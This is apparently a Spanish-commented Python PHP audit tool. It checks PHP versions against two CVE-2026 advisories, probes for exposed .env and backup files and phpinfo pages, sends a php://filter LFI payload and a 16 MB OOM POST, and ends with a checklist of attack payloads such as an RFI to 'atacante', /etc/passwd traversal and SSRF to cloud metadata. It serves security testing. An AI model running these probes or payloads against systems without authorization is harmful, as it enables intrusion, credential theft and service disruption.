#!/usr/bin/env python3
"""Auditoría PHP acotada: huella de versión, CVE-2026 del core, phpinfo
expuesto y LFI por wrapper php://filter, más el checklist clásico.

Fuentes (oct-2026):
  - CVE-2026-109618 (GHSA-w8hw-w9fx-j79w): la gestión de out-of-memory
    interrumpe PHP con datos internos de la petición a medio inicializar;
    la limpieza posterior los trata como válidos.
  - CVE-2026-109619 (GHSA-6wmf-4rv5-p3rp): estado interno de una petición
    sobrevive tras liberarse su memoria; la siguiente petición del mismo
    worker usa ese estado rancio antes de reinicializarse.
    Afectan a PHP 5.4–8.5.11 (CVSS 9.2, RCE sin autenticar + fuga de
    memoria). Parches: 8.5.12, 8.4.27, 8.3.36, 8.2.35. ≤8.1 es EOL y no
    recibe fix. (cloud.google.com blog 2026-10-21, php.net/archive/2026)
  - Clásicos: bugbase.ai top-10 (SQLi, XSS, RFI, LFI, CSRF, secuestro de
    sesión, traversal, IDOR, command injection, deserialización insegura),
    hacktricks PHP tricks (type juggling in_array/strcmp/preg_match, EAR,
    wrappers php://data://phar://, RCE vía eval/assert/usort/.htaccess/env,
    XAMPP CGI CVE-2024-4577), gist «List of PHP Exploitation Code»
    (exec/system/passthru/shell_exec/proc_open, eval/assert/create_function/
    preg_replace /e, callbacks ob_start/array_filter/usort, phpinfo() como
    divulgación) y netsolutions «severe PHP vulnerabilities».
"""

import argparse
import re
import secrets
import subprocess
import tempfile
import urllib.parse
from pathlib import Path

# versiones con fix de CVE-2026-109618/109619 por rama
PARCHES = {"8.5": (8, 5, 12), "8.4": (8, 4, 27), "8.3": (8, 3, 36),
           "8.2": (8, 2, 35)}
RUTA_FILTRO = ("php://filter/convert.base64-encode/resource=index.php")
PHPINFO_RUTAS = ("/phpinfo.php", "/info.php", "/pi.php", "/p.php",
                 "/test.php", "/php_information.php")
PARAMETROS_LFI = ("file", "page", "include", "path", "doc")
DESCARGO_RUTAS = ("/index.php~", "/index.php.bak", "/index.php.old",
                  "/.php.swp", "/phpunit.xml", "/composer.json", "/.env")
SONDEO_FUGA = 20  # peticiones por conexión para cazar estado rancio
VERSION = re.compile(r"PHP/?(\d+\.\d+(?:\.\d+)?)", re.I)


def _curl(url, segundos=10, cabeceras=False, cuerpo_a_devolver=4000):
    orden = ["curl", "-skL", "--max-time", str(segundos)]
    if cabeceras:
        orden += ["-D", "-", "-o", "/dev/null"]
    orden.append(url)
    try:
        proceso = subprocess.run(orden, capture_output=True, text=True,
                                 timeout=segundos + 5, check=False)
    except subprocess.TimeoutExpired:
        return ""
    return proceso.stdout[:cuerpo_a_devolver * 4]


def _version_de(texto):
    coincidencia = VERSION.search(texto)
    if not coincidencia:
        return None
    trozos = tuple(int(x) for x in coincidencia.group(1).split("."))
    if len(trozos) == 2:
        trozos += (0,)
    return trozos


def _veredicto_cve(version):
    if version is None:
        return ("no determinada", "comprobación manual: el servidor no "
                "publica versión de PHP")
    rama = f"{version[0]}.{version[1]}"
    if rama in PARCHES:
        if version >= PARCHES[rama]:
            return (f"parcheado (rama {rama})",
                    "CVE-2026-109618/109619 corregidos en esta rama")
        return (f"VULNERABLE (rama {rama})",
                f"actualiza a {PARCHES[rama][0]}.{PARCHES[rama][1]}."
                f"{PARCHES[rama][2]}: RCE sin autenticar + fuga de memoria")
    if version[0] == 8 or (version[0] == 7) or version >= (5, 4):
        return (f"VULNERABLE Y EOL (rama {rama})",
                "PHP ≤8.1 no recibe fix: migrar a 8.2+ es la única vía")
    return (f"anterior a 5.4 (rama {rama})", "fuera del rango publicado "
            "del advisory; trátalo como sin soporte")


def _sondeo_descargo(base, segundos):
    """Archivos que delatan o exponen una app PHP (backup de fuente,
    composer.json, .env). Se exige contenido característico: una página
    de error que reenvía a index.php no cuenta. Devuelve [(ruta, pista)]."""
    hallazgos = []
    for ruta in DESCARGO_RUTAS:
        cuerpo = _curl(base + ruta, segundos, cuerpo_a_devolver=2000)
        if not cuerpo:
            continue
        if "<?php" in cuerpo:
            hallazgos.append((ruta, "código fuente al descubierto"))
        elif ruta == "/composer.json" and ('"require"' in cuerpo
                                           or '"php"' in cuerpo):
            hallazgos.append((ruta, "app PHP confirmada"))
        elif ruta == "/phpunit.xml" and "<phpunit" in cuerpo:
            hallazgos.append((ruta, "entorno de desarrollo a la vista"))
        elif ruta == "/.env" and re.search(
                r"^(?:[A-Z][A-Z0-9_]{2,})=\S", cuerpo, re.M):
            hallazgos.append((ruta, "credenciales expuestas"))
    return hallazgos


def _sondeo_fuga(raiz, segundos):
    """Sonda de caja negra del CVE-2026-109619 (estado rancio entre
    peticiones): marca una petición (ruta 404 que las páginas de error
    suelen reflejar) y hace 20 peticiones normales sobre la MISMA
    conexión; si la marca aparece más de una vez en las respuestas,
    datos de una petición anterior contaminaron a las siguientes.
    Devuelve True/False/None (None = sin reflejo, inconcluyente)."""
    marcador = "kit" + secrets.token_hex(6)
    primera = _curl(f"{raiz}/{marcador}.php", segundos)
    if marcador not in primera:
        return None  # el servidor no refleja la ruta: sonda sin señal
    orden = ["curl", "-sk", "--max-time", str(segundos), f"{raiz}/{marcador}.php"]
    for _ in range(SONDEO_FUGA):
        orden += ["--next", "-sk", "--max-time", str(segundos), f"{raiz}/"]
    try:
        proceso = subprocess.run(orden, capture_output=True, text=True,
                                 timeout=segundos * (SONDEO_FUGA + 1),
                                 check=False)
    except subprocess.TimeoutExpired:
        return None
    return proceso.stdout.count(marcador) > 1


def _sondeo_oom(url, segundos):
    """Sonda del CVE-2026-109618 (OOM a medio inicializar): POST de 16 MB
    para forzar la gestión de memoria y GET inmediato en la misma
    conexión. 5xx tras el POST = sospecha; 413 = el límite está en el
    servidor web, no en PHP (inconcluyente)."""
    cuerpo = Path(tempfile.mkstemp(prefix="kitoom")[1])
    try:
        cuerpo.write_bytes(b"A" * (16 * 1024 * 1024))
        orden = ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code} ",
                 "--max-time", str(max(segundos, 30)), "-X", "POST",
                 "--data-binary", f"@{cuerpo}", url,
                 "--next", "-sk", "-o", "/dev/null", "-w", "%{http_code}",
                 "--max-time", str(segundos), url]
        try:
            proceso = subprocess.run(orden, capture_output=True, text=True,
                                     timeout=120, check=False)
        except subprocess.TimeoutExpired:
            return None
    finally:
        cuerpo.unlink(missing_ok=True)
    codigos = proceso.stdout.split()
    if len(codigos) != 2 or not all(c.isdigit() for c in codigos):
        return None
    post, get = (int(c) for c in codigos)
    if post == 413 or get == 413:
        return False
    return post >= 500 or get >= 500


def php_audit(url, segundos=10, seco=False, con_oom=True):
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        raise ValueError("--url debe ser http(s)://host[/ruta]")
    base = f"{parsed.scheme}://{parsed.netloc}"
    raiz = base + "/"
    if seco:
        print(f"Plan: ~{4 + len(PHPINFO_RUTAS) + len(PARAMETROS_LFI) + SONDEO_FUGA}"
              f" GETs + 1 POST de 16 MB acotados contra {base}: huella de "
              "versión, descargas indiscretas (~/.bak/.old/composer.json/"
              ".env), phpinfo(), LFI php://filter, sonda de fuga entre "
              "peticiones (CVE-2026-109619)"
              + (" y sonda OOM (CVE-2026-109618)" if con_oom
                 else " (OOM omitido con --sin-oom)")
              + "; el checklist va al final como referencia")
        return 0
    hallazgos = 0
    cabeceras = _curl(url, segundos, cabeceras=True)
    version = _version_de(cabeceras)
    cuerpo = _curl(url, segundos)
    php_visible = bool(version) or "PHPSESSID" in cabeceras + cuerpo \
        or "phpinfo()" in cuerpo
    version_texto = ("%d.%d.%d" % version) if version else "oculta"
    print(f"PHP detectado: {'sí' if php_visible else 'no visible'}; "
          f"versión: {version_texto}")
    if version:
        veredicto, consejo = _veredicto_cve(version)
        print(f"CVE-2026-109618/109619: {veredicto} — {consejo}")
        if "VULNERABLE" in veredicto:
            hallazgos += 1
    else:
        print("CVE-2026-109618/109619: versión oculta — el rango 5.4–8.5.11 "
              "es casi todo PHP vivo, así que se JUZGA POR SONDES activas, "
              "no por la cabecera")
    fugas = _sondeo_descargo(base, segundos)
    for ruta, pista in fugas:
        hallazgos += 1
        print(f"descarga indiscreta: {ruta} — {pista}")
    if not fugas:
        print("descargas indiscretas: ninguna de las 7 rutas típicas respondió")
    expuestos = []
    for ruta in PHPINFO_RUTAS:
        cuerpo = _curl(base + ruta, segundos)
        if "phpinfo()" in cuerpo or "PHP Extension" in cuerpo:
            expuestos.append(ruta)
    if expuestos:
        hallazgos += 1
        print(f"phpinfo() expuesto en: {', '.join(expuestos)} "
              "(divulgación de rutas, módulos y variables)")
    else:
        print("phpinfo(): no expuesto en las rutas típicas")
    lfi = []
    for parametro in PARAMETROS_LFI:
        prueba = _curl(f"{url}{'&' if '?' in url else '?'}{parametro}="
                       f"{urllib.parse.quote(RUTA_FILTRO, safe=':/=')}",
                       segundos)
        if re.search(r"PD9waHA|PC\?php", prueba):  # base64 de <?php
            lfi.append(parametro)
    if lfi:
        hallazgos += 1
        print(f"LFI probable vía php://filter en parámetro(s): "
              f"{', '.join(lfi)} (respuesta con fuente base64)")
    else:
        print("php://filter: ningún parámetro típico devolvió fuente "
              "base64 (no descarta LFI en parámetros no comunes)")
    fuga = _sondeo_fuga(raiz, segundos)
    if fuga is True:
        hallazgos += 1
        print("FUGA entre peticiones: la marca de una petición apareció en "
              "respuestas posteriores — patrón compatible con "
              "CVE-2026-109619 (estado rancio); repite la prueba para "
              "confirmar antes de escalar")
    elif fuga is False:
        print("fuga entre peticiones: 20 peticiones en la misma conexión, "
              "sin contaminación de la marca")
    else:
        print("fuga entre peticiones: INCONCLUYENTE (el servidor no refleja "
              "la ruta en el 404; prueba contra un endpoint que refleje "
              "parámetros)")
    if con_oom:
        oom = _sondeo_oom(url, segundos)
        if oom is True:
            hallazgos += 1
            print("OOM: POST de 16 MB seguido de GET devolvió 5xx en la "
                  "misma conexión — patrón compatible con CVE-2026-109618; "
                  "repite y confirma")
        elif oom is False:
            print("OOM: sin 5xx tras el POST de 16 MB (o el límite saltó en "
                  "el servidor web: 413)")
        else:
            print("OOM: INCONCLUYENTE (el POST no devolvió código)")
    print()
    print(CHECKLIST)
    return 0 if hallazgos else 1


CHECKLIST = """Checklist de exploits clásicos de PHP (guía, no automático):
 1. SQL injection — concatenar entrada en la query; probar admin' -- y
    inyección ciega por tiempo (SLEEP/BENCHMARK). [bugbase]
 2. XSS reflejado/storeado — entrada sin htmlspecialchars; contexto JS. [bugbase]
 3. RFI — include($_GET['p']) con allow_url_include=On: p=https://atacante/x.txt? [bugbase]
 4. LFI + wrappers — php://filter (leer fuente), data:// y expect:// (RCE
    si hay wrapper), phar:// contra unserialize implícita. [bugbase, hacktricks]
 5. Path traversal — ../../../../etc/passwd y filtros dobles (%252e). [bugbase]
 6. Type juggling — in_array('a', $nums, false), strcmp con array,
    '0e...' hashes con preg_match; comparaciones == vs ===. [hacktricks]
 7. Command injection — shell_exec/system/passthru con entrada en
    backticks o ;|&&. [bugbase, gist]
 8. Deserialización insegura — unserialize(user_data): POP chains con
    __wakeup/__destruct; phar:// como vector. [bugbase, hacktricks]
 9. Ejecución de código PHP — eval/assert/create_function/preg_replace /e,
    callbacks (ob_start, array_filter, usort) con cadena del atacante. [gist, hacktricks]
10. CSRF / secuestro de sesión / IDOR — tokens ausentes, PHPSESSID
    predecible o fijable, ids enumerables. [bugbase]
11. RCE por entorno/htaccess — RCE via env vars (cgi.force_redirect),
    .htaccess con auto_prepend_file, XAMPP CGI CVE-2024-4577 (%2d vs -). [hacktricks]
12. SSRF en funciones PHP — file_get_contents/curl con URL del usuario;
    metadatos 169.254.169.254; gopher:// (Gopherus). [bugbase]
13. CVE-2026-109618/109619 (core, CVSS 9.2) — RCE sin autenticar y fuga
    de memoria por estado de petición a medio inicializar/estado rancio;
    PHP 5.4–8.5.11; fix en 8.5.12/8.4.27/8.3.36/8.2.35; ≤8.1 EOL sin fix.
14. Divulgación — phpinfo() accesible, errores con ruta absoluta,
    get_defined_vars()/debug_backtrace en endpoints de depuración. [gist]
Referencias: bugbase.ai top-10 PHP · hacktricks PHP-tricks · gist
4d423134178730948f40abb70106b5bf · netsolutions severe-PHP ·
cloud.google.com CVE-2026-109618/109619 · php.net/archive/2026."""


def php_checklist(dry=False):
    if dry:
        print("Plan: imprimir el checklist clásico de PHP (14 vectores, "
              "sin red)")
        return 0
    print(CHECKLIST)
    return 0


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    sub = parser.add_subparsers(dest="accion", required=True)
    audit = sub.add_parser("php-audit")
    audit.add_argument("--url", required=True)
    audit.add_argument("--segundos", type=int, default=10)
    audit.add_argument("--sin-oom", action="store_true",
                       help="omite la sonda OOM (POST de 16 MB)")
    audit.add_argument("--dry-run", action="store_true")
    checklist = sub.add_parser("php-checklist")
    checklist.add_argument("--dry-run", action="store_true",
                           help="el checklist es estático: se imprime igual")
    args = parser.parse_args()
    try:
        if args.accion == "php-audit":
            return php_audit(args.url, args.segundos, args.dry_run,
                           not args.sin_oom)
        return php_checklist(args.dry_run)
    except (OSError, ValueError, subprocess.TimeoutExpired) as exc:
        parser.error(str(exc))


if __name__ == "__main__":
    raise SystemExit(main())
